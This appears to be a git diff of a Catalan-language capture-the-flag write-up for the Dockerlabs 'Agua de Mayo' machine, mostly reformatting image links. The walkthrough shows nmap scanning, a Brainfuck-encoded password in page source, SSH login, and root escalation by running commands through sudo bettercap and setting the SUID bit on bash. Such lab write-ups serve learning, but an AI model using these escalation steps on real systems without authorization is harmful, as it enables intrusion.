@@ -1,12 +1,6 @@
 # Agua de Mayo
 
-Plataforma: Dockerlabs
-OS: Linux
-Level: Easy
-Status: Done
-Complete: Yes
-EJPT: yes
-Created time: 5 de diciembre de 2024 21:18
+Plataforma: Dockerlabs OS: Linux Level: Easy Status: Done Complete: Yes EJPT: yes Created time: 5 de diciembre de 2024 21:18
 
 ## Reconeixement
 
@@ -16,25 +10,25 @@ Created time: 5 de diciembre de 2024 21:18
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n 172.17.0.2 -oG allports
 ```
 
-![image.png](/images/DockerLabs/image.png)
+![image.png](../../.gitbook/assets/image.png)
 
 ```bash
 sudo nmap -p22,80 -sCV 172.17.0.2 -oN targeted
 ```
 
-![image.png](/images/DockerLabs/image%201.png)
+![image.png](<../../.gitbook/assets/image 1.png>)
 
 ```bash
 sudo nmap -p80 --script=http-enum 172.17.0.2
 ```
 
-![image.png](/images/DockerLabs/image%202.png)
+![image.png](<../../.gitbook/assets/image 2.png>)
 
 Directori : /images/
 
 Trobem una imatge :
 
-Agua_ssh
+Agua\_ssh
 
 Provem de veure si conté dades:
 
@@ -43,7 +37,7 @@ steghide info agua_ssh.jpg
 Demana password
 ```
 
-![image.png](/images/DockerLabs/image%203.png)
+![image.png](<../../.gitbook/assets/image 3.png>)
 
 Revisem la web per veure si trobem algo al codi:
 
@@ -53,10 +47,9 @@ curl -s -X GET [http://172.17.0.2/](http://172.17.0.2/)
 
 Ens troba una última linea:
 
-++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
+++++++++++\[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
 
-Busquem un decode :
-Codi BrainFuck
+Busquem un decode : Codi BrainFuck
 
 Decodifiquem i surt:
 
@@ -68,9 +61,9 @@ Conectem per SSH amb usuari "Agua" de la imatge i el password de la web "bebeagu
 ssh [agua@172.17.0.2](mailto:agua@172.17.0.2)
 ```
 
-![image.png](/images/DockerLabs/image%204.png)
+![image.png](<../../.gitbook/assets/image 4.png>)
 
-![image.png](/images/DockerLabs/image%205.png)
+![image.png](<../../.gitbook/assets/image 5.png>)
 
 Podem executar "bettercap" sense password i com a root
 
@@ -78,13 +71,13 @@ Podem executar "bettercap" sense password i com a root
 sudo bettercap
 ```
 
-![image.png](/images/DockerLabs/image%206.png)
+![image.png](<../../.gitbook/assets/image 6.png>)
 
 Veiem que es poden executar instruccions amb ! cmd
 
 Veiem que ja som root
 
-![image.png](/images/DockerLabs/image%207.png)
+![image.png](<../../.gitbook/assets/image 7.png>)
 
 Per mirar de tenir una shell mes operativa done permis al bash :
 
@@ -97,4 +90,4 @@ al sortir de bettercap provem la shell
 
 bin/bash -p
 
-![image.png](/images/DockerLabs/image%208.png)
+![image.png](<../../.gitbook/assets/image 8.png>)
